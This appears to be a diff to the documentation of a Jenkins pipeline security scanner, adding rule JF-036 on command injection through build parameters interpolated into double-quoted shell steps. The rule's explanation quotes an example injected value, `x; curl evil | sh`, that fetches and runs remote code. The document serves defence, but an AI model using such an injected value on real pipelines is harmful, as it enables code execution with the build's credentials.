@@ -27,7 +27,7 @@ expression.
 
 ## What it covers
 
-35 checks · 12 have an autofix patch (``--fix``).
+36 checks · 12 have an autofix patch (``--fix``).
 
 | Check | Title | Severity | Fix |
 |-------|-------|----------|-----|
@@ -66,6 +66,7 @@ expression.
 | [JF-033](#jf-033) | withCredentials secret leaked via Groovy ${...} interpolation in sh step | <span class="pg-sev pg-sev--high">HIGH</span> |  |
 | [JF-034](#jf-034) | Pipeline declares a password() build parameter | <span class="pg-sev pg-sev--high">HIGH</span> |  |
 | [JF-035](#jf-035) | httpRequest step disables SSL verification | <span class="pg-sev pg-sev--high">HIGH</span> |  |
+| [JF-036](#jf-036) | Script step interpolates a build parameter (params.*) | <span class="pg-sev pg-sev--high">HIGH</span> |  |
 
 ---
 
@@ -801,6 +802,30 @@ The HTTP Request plugin's ``ignoreSslErrors: true`` flag tells the step to accep
 **Recommended action**
 
 Drop ``ignoreSslErrors: true`` from the ``httpRequest`` step. Fix certificate trust at the source: install the internal CA into the controller's truststore, or use a properly-issued certificate on the upstream service. Disabling verification on a CI runner lets any actor on the network path between Jenkins and the target inject responses, including payloads that flow into downstream stages.
+
+</div>
+
+</div>
+
+<div class="pg-rule pg-rule--high" markdown>
+
+## JF-036: Script step interpolates a build parameter (params.*) { #jf-036 }
+
+<div class="pg-rule__tags">
+<span class="pg-sev pg-sev--high">HIGH</span> <span class="pg-tag pg-tag--owasp">CICD-SEC-4</span> <span class="pg-tag pg-tag--esf">ESF-D-INJECTION</span> <span class="pg-tag pg-tag--cwe">CWE-78</span>
+</div>
+
+A Jenkins build parameter is set by whoever queues the run: anyone with Build permission, an upstream `build job:` passing `parameters:`, or a webhook / remote trigger. A `string` parameter is free-form text. When Groovy interpolates it into a double-quoted shell body (`sh "deploy ${params.TARGET}"`) the value is substituted *before* the shell parses the line, so `params.TARGET = 'x; curl evil | sh'` runs the injected command on the agent in the build's full credential context. This is the Jenkins peer of the GHA `${{ inputs.X }}` and ADO `${{ parameters.X }}` injection rules. Only double-quoted / triple-double-quoted bodies are flagged; single-quoted Groovy strings (`sh '... $params ...'`) don't interpolate and are safe. JF-002 covers the SCM-env-var (`$BRANCH_NAME`) variant and JF-033 the `withCredentials` secret-leak variant; this rule is specifically the build-parameter source.
+
+**Known false-positive modes**
+
+- A parameter consumed purely as data inside a double-quoted body (`sh "echo ${params.NOTE}"`) is still flagged: the double quotes let `$(...)` / backticks in the value execute, so it is genuinely injectable, not a false positive.
+
+<div class="pg-rule__rec" markdown>
+
+**Recommended action**
+
+Don't splice `${params.X}` into a double-quoted `sh` / `bat` / `powershell` body. Single-quote the Groovy string so it isn't interpolated, and let the shell read the value from the environment: `withEnv(["TAG=${params.TAG}"]) { sh 'build --tag "$TAG"' }`. The single-quoted form passes the value as one literal argument instead of letting it break out of the command.
 
 </div>
 
